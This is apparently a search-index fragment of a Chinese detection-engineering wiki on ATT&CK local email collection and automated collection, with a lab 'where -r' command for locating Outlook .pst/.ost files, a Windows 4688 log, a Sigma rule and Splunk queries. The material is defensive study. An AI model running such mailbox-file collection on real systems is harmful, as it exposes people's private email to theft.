Outlook\u5c06\u6570\u636e\u672c\u5730\u5b58\u50a8\u5728\u6269\u5c55\u540d\u4e3a.ost\u7684\u8131\u673a\u6570\u636e\u6587\u4ef6\u4e2d\u3002Outlook 2010\u548c\u66f4\u9ad8\u7248\u672c\u652f\u6301.ost\u6587\u4ef6\u5927\u5c0f\u6700\u5927\u4e3a50GB\uff0c\u800c\u65e9\u671f\u7248\u672c\u7684Outlook\u652f\u6301\u6700\u592720GB\u3002Outlook 2013\uff08\u53ca\u66f4\u65e9\u7248\u672c\uff09\u548cPOP\u5e10\u6237\u4e2d\u7684IMAP\u5e10\u6237\u4f7f\u7528Outlook\u6570\u636e\u6587\u4ef6\uff08.pst\uff09\uff0c\u800c\u4e0d\u662f.ost\uff0c\u800cOutlook 2016\uff08\u53ca\u66f4\u9ad8\u7248\u672c\uff09\u4e2d\u7684IMAP\u5e10\u6237\u4f7f\u7528.ost\u6587\u4ef6\u3002\u4e24\u79cd\u7c7b\u578b\u7684Outlook\u6570\u636e\u6587\u4ef6\u901a\u5e38\u90fd\u5b58\u50a8\u5728C:\\Users\\ \\Documents\\Outlook Files\u6216C:\\Users\\ \\AppData\\Local\\Microsoft\\Outlook\u4e2d \u6d4b\u8bd5\u6848\u4f8b \u6a21\u62df\u4f7f\u7528where\u547d\u4ee4\u8fdb\u884c\u7b5b\u9009\u6307\u5b9a\u6587\u4ef6\u5939\u4e0b\u540e\u7f00\u4e3a.ost\u6216\u8005.pst\u7684\u6587\u4ef6 C:\\Users\\Administrator>where \u6b64\u547d\u4ee4\u7684\u8bed\u6cd5\u662f: WHERE [/R dir] [/Q] [/F] [/T] pattern... \u63cf\u8ff0: \u663e\u793a\u7b26\u5408\u641c\u7d22\u6a21\u5f0f\u7684\u6587\u4ef6\u4f4d\u7f6e\u3002\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u641c\u7d22\u662f\u5728\u5f53\u524d\u76ee\u5f55\u548c PATH \u73af\u5883\u53d8\u91cf\u6307\u5b9a\u7684\u8def\u5f84\u4e2d\u6267\u884c\u7684\u3002 \u53c2\u6570\u5217\u8868: /R \u4ece\u6307\u5b9a\u76ee\u5f55\u5f00\u59cb\uff0c\u9012\u5f52\u6027\u641c\u7d22\u5e76\u663e\u793a\u7b26\u5408\u6307\u5b9a\u6a21\u5f0f\u7684\u6587\u4ef6\u3002 /Q \u53ea\u8fd4\u56de\u9000\u51fa\u4ee3\u7801\uff0c\u4e0d\u663e\u793a\u5339\u914d\u6587\u4ef6\u5217\u8868\u3002(\u5b89\u9759\u6a21\u5f0f) \u5339\u914d\u6587\u4ef6\u3002(\u5b89\u9759\u6a21\u5f0f) /F \u663e\u793a\u6240\u6709\u76f8\u914d\u6587\u4ef6\u5e76\u7528\u53cc\u5f15\u53f7\u62ec\u4e0a\u3002 /T \u663e\u793a\u6240\u6709\u76f8\u914d\u6587\u4ef6\u7684\u6587\u4ef6\u7684\u6587\u4ef6\u3002 pattern \u6307\u5b9a\u8981\u5339\u914d\u7684\u6587\u4ef6\u7684\u641c\u7d22\u6a21\u5f0f\u3002\u901a\u914d\u7b26 * \u548c ? \u53ef\u4ee5\u7528\u5728\u6a21\u5f0f\u4e2d\u3002 \u4e5f\u53ef\u4ee5\u6307\u5b9a \"$env:pattern\" \u548c \"path:pattern\" \u683c\u5f0f; \u5176\u4e2d \"env\" \u662f\u73af\u5883\u53d8\u91cf\uff0c\u641c\u7d22\u662f\u5728 \"env\" \u53d8\u91cf\u7684\u6307\u5b9a\u7684\u8def\u5f84\u4e2d\u6267\u884c\u7684\u3002 \u8fd9\u4e9b\u683c\u5f0f\u4e0d\u5e94\u8be5\u8ddf /R \u4e00\u8d77\u4f7f\u7528\u3002\u6b64\u641c\u7d22\u4e5f\u53ef\u4ee5\u7528\u5c06 PATHEXT \u53d8 \u91cf\u6269\u5c55\u540d\u9644\u52a0\u4e8e\u6b64\u6a21\u5f0f\u7684\u65b9\u5f0f\u5b8c\u6210\u3002 /? \u663e\u793a\u6b64\u5e2e\u52a9\u6d88\u606f\u3002 \u6ce8\u610f: \u5982\u679c\u641c\u7d22\u6210\u529f\uff0c\u6b64\u5de5\u5177\u8fd4\u56de\u9519\u8bef\u7ea7\u522b 0; \u5982\u679c\u4e0d\u6210\u529f\uff0c\u8fd4\u56de 1; \u5982\u679c\u5931 \u8d25\u6216\u53d1\u751f\u9519\u8bef\uff0c\u8fd4\u56de 2\u3002 \u793a\u4f8b: WHERE /? WHERE myfilename1 myfile????.* WHERE $windir:*.* WHERE /R c:\\windows *.exe *.dll *.bat WHERE /Q ??.??? WHERE \"c:\\windows;c:\\windows\\system32:*.dll\" WHERE /F /T *.dll \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Users\\Administrator>where -r c:\\users\\administrator\\ *.pst c:\\Users\\administrator\\qax.pst \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u65e5\u5fd7\uff1b4688:\u8fdb\u7a0b\u521b\u5efa \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: QAX\\Administrator \u5e10\u6237\u540d: Administrator \u5e10\u6237\u57df: QAX \u767b\u5f55 ID: 0x4463EA \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x15e0 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\where.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1936 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\High Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x12b0 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: where -r c:\\users\\administrator\\ *.pst \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma-win\u89c4\u5219 title: \u4f7f\u7528where\u547d\u4ee4\u67e5\u627e\u672c\u5730ost\u3001pst\u540e\u7f00\u6587\u4ef6 tags: T1114 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Processcommandline: - '.ost' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c\uff0c\u5305\u542b.ost - '.pst' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c\uff0c\u5305\u542b.pst condition: selection level: low \u5efa\u8bae \u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u4ee5\u4e86\u89e3\u53ef\u4ee5\u91c7\u53d6\u54ea\u4e9b\u63aa\u65bd\u6765\u6536\u96c6\u672c\u5730\u7535\u5b50\u90ae\u4ef6\u6587\u4ef6\u3002\u76d1\u89c6\u8bbf\u95ee\u672c\u5730\u7535\u5b50\u90ae\u4ef6\u6587\u4ef6\u7684\u5f02\u5e38\u8fdb\u7a0b\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u4f8b\u5982Windows Management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1114 https://attack.mitre.org/techniques/T1114/001/","title":"T1114-001-win-\u672c\u5730\u7535\u5b50\u90ae\u4ef6\u6536\u96c6"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#t1114-001-win-","text":"","title":"T1114-001-win-\u672c\u5730\u7535\u5b50\u90ae\u4ef6\u6536\u96c6"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u7528\u6237\u672c\u5730\u7cfb\u7edf\u4e0a\u6536\u96c6\u7535\u5b50\u90ae\u7bb1\u4fe1\u606f\uff0c\u7528\u4ee5\u6536\u96c6\u654f\u611f\u4fe1\u606f\u3002\u53ef\u4ee5\u4ece\u7528\u6237\u7684\u672c\u5730\u7cfb\u7edf\u4e2d\u83b7\u53d6\u5305\u542b\u7535\u5b50\u90ae\u4ef6\u6570\u636e\u7684\u6587\u4ef6\uff0c\u4f8b\u5982Outlook\u5b58\u50a8\u6216\u7f13\u5b58\u6587\u4ef6\u3002 Outlook\u5c06\u6570\u636e\u672c\u5730\u5b58\u50a8\u5728\u6269\u5c55\u540d\u4e3a.ost\u7684\u8131\u673a\u6570\u636e\u6587\u4ef6\u4e2d\u3002Outlook 2010\u548c\u66f4\u9ad8\u7248\u672c\u652f\u6301.ost\u6587\u4ef6\u5927\u5c0f\u6700\u5927\u4e3a50GB\uff0c\u800c\u65e9\u671f\u7248\u672c\u7684Outlook\u652f\u6301\u6700\u592720GB\u3002Outlook 2013\uff08\u53ca\u66f4\u65e9\u7248\u672c\uff09\u548cPOP\u5e10\u6237\u4e2d\u7684IMAP\u5e10\u6237\u4f7f\u7528Outlook\u6570\u636e\u6587\u4ef6\uff08.pst\uff09\uff0c\u800c\u4e0d\u662f.ost\uff0c\u800cOutlook 2016\uff08\u53ca\u66f4\u9ad8\u7248\u672c\uff09\u4e2d\u7684IMAP\u5e10\u6237\u4f7f\u7528.ost\u6587\u4ef6\u3002\u4e24\u79cd\u7c7b\u578b\u7684Outlook\u6570\u636e\u6587\u4ef6\u901a\u5e38\u90fd\u5b58\u50a8\u5728C:\\Users\\ \\Documents\\Outlook Files\u6216C:\\Users\\ \\AppData\\Local\\Microsoft\\Outlook\u4e2d","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_1","text":"\u6a21\u62df\u4f7f\u7528where\u547d\u4ee4\u8fdb\u884c\u7b5b\u9009\u6307\u5b9a\u6587\u4ef6\u5939\u4e0b\u540e\u7f00\u4e3a.ost\u6216\u8005.pst\u7684\u6587\u4ef6 C:\\Users\\Administrator>where \u6b64\u547d\u4ee4\u7684\u8bed\u6cd5\u662f: WHERE [/R dir] [/Q] [/F] [/T] pattern... \u63cf\u8ff0: \u663e\u793a\u7b26\u5408\u641c\u7d22\u6a21\u5f0f\u7684\u6587\u4ef6\u4f4d\u7f6e\u3002\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u641c\u7d22\u662f\u5728\u5f53\u524d\u76ee\u5f55\u548c PATH \u73af\u5883\u53d8\u91cf\u6307\u5b9a\u7684\u8def\u5f84\u4e2d\u6267\u884c\u7684\u3002 \u53c2\u6570\u5217\u8868: /R \u4ece\u6307\u5b9a\u76ee\u5f55\u5f00\u59cb\uff0c\u9012\u5f52\u6027\u641c\u7d22\u5e76\u663e\u793a\u7b26\u5408\u6307\u5b9a\u6a21\u5f0f\u7684\u6587\u4ef6\u3002 /Q \u53ea\u8fd4\u56de\u9000\u51fa\u4ee3\u7801\uff0c\u4e0d\u663e\u793a\u5339\u914d\u6587\u4ef6\u5217\u8868\u3002(\u5b89\u9759\u6a21\u5f0f) \u5339\u914d\u6587\u4ef6\u3002(\u5b89\u9759\u6a21\u5f0f) /F \u663e\u793a\u6240\u6709\u76f8\u914d\u6587\u4ef6\u5e76\u7528\u53cc\u5f15\u53f7\u62ec\u4e0a\u3002 /T \u663e\u793a\u6240\u6709\u76f8\u914d\u6587\u4ef6\u7684\u6587\u4ef6\u7684\u6587\u4ef6\u3002 pattern \u6307\u5b9a\u8981\u5339\u914d\u7684\u6587\u4ef6\u7684\u641c\u7d22\u6a21\u5f0f\u3002\u901a\u914d\u7b26 * \u548c ? \u53ef\u4ee5\u7528\u5728\u6a21\u5f0f\u4e2d\u3002 \u4e5f\u53ef\u4ee5\u6307\u5b9a \"$env:pattern\" \u548c \"path:pattern\" \u683c\u5f0f; \u5176\u4e2d \"env\" \u662f\u73af\u5883\u53d8\u91cf\uff0c\u641c\u7d22\u662f\u5728 \"env\" \u53d8\u91cf\u7684\u6307\u5b9a\u7684\u8def\u5f84\u4e2d\u6267\u884c\u7684\u3002 \u8fd9\u4e9b\u683c\u5f0f\u4e0d\u5e94\u8be5\u8ddf /R \u4e00\u8d77\u4f7f\u7528\u3002\u6b64\u641c\u7d22\u4e5f\u53ef\u4ee5\u7528\u5c06 PATHEXT \u53d8 \u91cf\u6269\u5c55\u540d\u9644\u52a0\u4e8e\u6b64\u6a21\u5f0f\u7684\u65b9\u5f0f\u5b8c\u6210\u3002 /? \u663e\u793a\u6b64\u5e2e\u52a9\u6d88\u606f\u3002 \u6ce8\u610f: \u5982\u679c\u641c\u7d22\u6210\u529f\uff0c\u6b64\u5de5\u5177\u8fd4\u56de\u9519\u8bef\u7ea7\u522b 0; \u5982\u679c\u4e0d\u6210\u529f\uff0c\u8fd4\u56de 1; \u5982\u679c\u5931 \u8d25\u6216\u53d1\u751f\u9519\u8bef\uff0c\u8fd4\u56de 2\u3002 \u793a\u4f8b: WHERE /? WHERE myfilename1 myfile????.* WHERE $windir:*.* WHERE /R c:\\windows *.exe *.dll *.bat WHERE /Q ??.??? WHERE \"c:\\windows;c:\\windows\\system32:*.dll\" WHERE /F /T *.dll","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_3","text":"C:\\Users\\Administrator>where -r c:\\users\\administrator\\ *.pst c:\\Users\\administrator\\qax.pst","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_4","text":"windows\u5b89\u5168\u65e5\u5fd7\uff1b4688:\u8fdb\u7a0b\u521b\u5efa \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: QAX\\Administrator \u5e10\u6237\u540d: Administrator \u5e10\u6237\u57df: QAX \u767b\u5f55 ID: 0x4463EA \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x15e0 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\where.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1936 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\High Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x12b0 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: where -r c:\\users\\administrator\\ *.pst","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#sigma-win","text":"title: \u4f7f\u7528where\u547d\u4ee4\u67e5\u627e\u672c\u5730ost\u3001pst\u540e\u7f00\u6587\u4ef6 tags: T1114 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Processcommandline: - '.ost' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c\uff0c\u5305\u542b.ost - '.pst' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c\uff0c\u5305\u542b.pst condition: selection level: low","title":"sigma-win\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_6","text":"\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u4ee5\u4e86\u89e3\u53ef\u4ee5\u91c7\u53d6\u54ea\u4e9b\u63aa\u65bd\u6765\u6536\u96c6\u672c\u5730\u7535\u5b50\u90ae\u4ef6\u6587\u4ef6\u3002\u76d1\u89c6\u8bbf\u95ee\u672c\u5730\u7535\u5b50\u90ae\u4ef6\u6587\u4ef6\u7684\u5f02\u5e38\u8fdb\u7a0b\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u4f8b\u5982Windows Management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_7","text":"MITRE-ATT&CK-T1114 https://attack.mitre.org/techniques/T1114/001/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/","text":"T1119-win-\u81ea\u52a8\u6536\u96c6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4e00\u65e6\u5728\u7cfb\u7edf\u6216\u7f51\u7edc\u4e2d\u5efa\u7acb\u7acb\u8db3\u70b9\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u4f7f\u7528\u81ea\u52a8\u5316\u6280\u672f\u6765\u6536\u96c6\u5185\u90e8\u6570\u3002\u6267\u884c\u6b64\u6280\u672f\u7684\u65b9\u6cd5\u53ef\u4ee5\u5305\u62ec\u4f7f\u7528\u547d\u4ee4\u548c\u811a\u672c\u89e3\u91ca\u5668\u6765\u641c\u7d22\u548c\u590d\u5236\u9002\u5408\u6807\u51c6\u7684\u4fe1\u606f\uff08\u6307\u7b26\u5408\u653b\u51fb\u8005\u6536\u96c6\u7684\u6570\u636e\uff09\uff0c\u4f8b\u5982\u5728\u7279\u5b9a\u65f6\u95f4\u95f4\u9694\u7684\u6587\u4ef6\u7c7b\u578b\uff0c\u4f4d\u7f6e\u6216\u540d\u79f0\u3002\u6b64\u529f\u80fd\u4e5f\u53ef\u4ee5\u5185\u7f6e\u5230\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u4e2d\u3002 \u8be5\u6280\u672f\u53ef\u4ee5\u7ed3\u5408\u4f7f\u7528\u5176\u4ed6\u6280\u672f\uff0c\u4f8b\u5982\u6587\u4ef6\u548c\u76ee\u5f55\u53d1\u73b0\u4ee5\u53ca\u6a2a\u5411\u5de5\u5177\u4f20\u8f93\uff0c\u4ee5\u8bc6\u522b\u548c\u79fb\u52a8\u6587\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0\uff0c\u53ef\u53c2\u8003\u76f8\u5173\u81ea\u52a8\u5316\u6536\u96c6powershell\u811a\u672c \u68c0\u6d4b\u65e5\u5fd7 Windows\u5b89\u5168\u65e5\u5fd7\u3001sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0\uff0c\u53ef\u53c2\u8003\u76f8\u5173\u81ea\u52a8\u5316\u6536\u96c6powershell\u811a\u672c \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 \u6839\u636e\u6240\u4f7f\u7528\u7684\u65b9\u6cd5\uff0c\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u6279\u5904\u7406\u6587\u4ef6\u6216\u811a\u672c\u4e2d\u547d\u4ee4\u884c\u754c\u9762\u4e0a\u7684\u516c\u7528\u6587\u4ef6\u7cfb\u7edf\u547d\u4ee4\u548c\u53c2\u6570\u3002\u53d6\u51b3\u4e8e\u7cfb\u7edf\u548c\u7f51\u7edc\u73af\u5883\uff0c\u7c7b\u4f3c\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u53ef\u80fd\u4f1a\u5f88\u4e0d\u6b63\u5e38\u3002\u81ea\u52a8\u6536\u96c6\u53ef\u80fd\u4f1a\u4e0e\u5176\u4ed6\u6280\u672f\uff08\u4f8b\u5982\u6570\u636e\u6682\u5b58\uff09\u4e00\u8d77\u53d1\u751f\u3002\u8fd9\u6837\uff0c\u6587\u4ef6\u8bbf\u95ee\u76d1\u89c6\u663e\u793a\u4e86\u6267\u884c\u987a\u5e8f\u6587\u4ef6\u6253\u5f00\u7684\u5f02\u5e38\u8fc7\u7a0b\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u4e00\u6b21\u5c06\u52a8\u4f5c\u590d\u5236\u5230\u591a\u4e2a\u6587\u4ef6\u7684\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u53e6\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u8fd9\u53ef\u80fd\u8868\u793a\u81ea\u52a8\u6536\u96c6\u884c\u4e3a\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u6570\u636e\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u4f8b\u5982Windows Management Instrumentation\u548cPowerShell\uff09\u6765\u83b7\u53d6\u6570\u636e\u3002 \u201cindex=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 Image=\u201d\u201d*\\\\findstr.exe\u201d\u201d CommandLine=\u201d\u201d*/e*\u201d\u201d) //findstr used to search for a specefic file extension index=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d Message=\u201d\u201d*get-childitem*\u201d\u201d //search for specefic file with get-childitem in powershell index=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d Message=\u201d\u201d*Get-ChildItem -Recurse *\u201d\u201d //search for specefic file recursivly with get-childitem in powershell index=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d Message=\u201d\u201d*Get-Service*\u201d\u201d //get service information with powershell index=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d Message=\u201d\u201d*Get-process*\u201d\u201d //get process information with powershell index=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 Image=\u201d\u201d*\\\\sc.exe\u201d\u201d CommandLine=\u201d\u201d*query*\u201d\u201d) //get service list with sc.exe index=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 Image=\u201d\u201d*\\\\wmic.exe\u201d\u201d CommandLine=*Process list*) //get process list with wmic.exe index=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 Image=\u201d\u201d*\\\\wmic.exe\u201d\u201d CommandLine=*service list*) //get service list with wmic.exe \u5efa\u8bae \u5982\u679c\u4f60\u5bf9windows\u4ee5\u53capowershell\u6bd4\u8f83\u4e86\u89e3\u7684\u8bdd\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528Windows\u65e5\u5fd7\u4ee5\u53capowershell\u65e5\u5fd7\u6765\u5b8c\u6210\u76d1\u89c6\u68c0\u6d4b\uff0c\u5f53\u7136\u6700\u597d\u7684\u65b9\u6cd5\u662f\u4f7f\u7528sysmon\u65e5\u5fd7\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1119 https://attack.mitre.org/techniques/T1119/","title":"T1119-win-\u81ea\u52a8\u6536\u96c6"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#t1119-win-","text":"","title":"T1119-win-\u81ea\u52a8\u6536\u96c6"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#attck","text":"\u4e00\u65e6\u5728\u7cfb\u7edf\u6216\u7f51\u7edc\u4e2d\u5efa\u7acb\u7acb\u8db3\u70b9\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u4f7f\u7528\u81ea\u52a8\u5316\u6280\u672f\u6765\u6536\u96c6\u5185\u90e8\u6570\u3002\u6267\u884c\u6b64\u6280\u672f\u7684\u65b9\u6cd5\u53ef\u4ee5\u5305\u62ec\u4f7f\u7528\u547d\u4ee4\u548c\u811a\u672c\u89e3\u91ca\u5668\u6765\u641c\u7d22\u548c\u590d\u5236\u9002\u5408\u6807\u51c6\u7684\u4fe1\u606f\uff08\u6307\u7b26\u5408\u653b\u51fb\u8005\u6536\u96c6\u7684\u6570\u636e\uff09\uff0c\u4f8b\u5982\u5728\u7279\u5b9a\u65f6\u95f4\u95f4\u9694\u7684\u6587\u4ef6\u7c7b\u578b\uff0c\u4f4d\u7f6e\u6216\u540d\u79f0\u3002\u6b64\u529f\u80fd\u4e5f\u53ef\u4ee5\u5185\u7f6e\u5230\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u4e2d\u3002 \u8be5\u6280\u672f\u53ef\u4ee5\u7ed3\u5408\u4f7f\u7528\u5176\u4ed6\u6280\u672f\uff0c\u4f8b\u5982\u6587\u4ef6\u548c\u76ee\u5f55\u53d1\u73b0\u4ee5\u53ca\u6a2a\u5411\u5de5\u5177\u4f20\u8f93\uff0c\u4ee5\u8bc6\u522b\u548c\u79fb\u52a8\u6587\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_1","text":"\u6682\u65e0\uff0c\u53ef\u53c2\u8003\u76f8\u5173\u81ea\u52a8\u5316\u6536\u96c6powershell\u811a\u672c","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_2","text":"Windows\u5b89\u5168\u65e5\u5fd7\u3001sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_3","text":"\u6682\u65e0\uff0c\u53ef\u53c2\u8003\u76f8\u5173\u81ea\u52a8\u5316\u6536\u96c6powershell\u811a\u672c","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#splunk","text":"\u6839\u636e\u6240\u4f7f\u7528\u7684\u65b9\u6cd5\uff0c\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u6279\u5904\u7406\u6587\u4ef6\u6216\u811a\u672c\u4e2d\u547d\u4ee4\u884c\u754c\u9762\u4e0a\u7684\u516c\u7528\u6587\u4ef6\u7cfb\u7edf\u547d\u4ee4\u548c\u53c2\u6570\u3002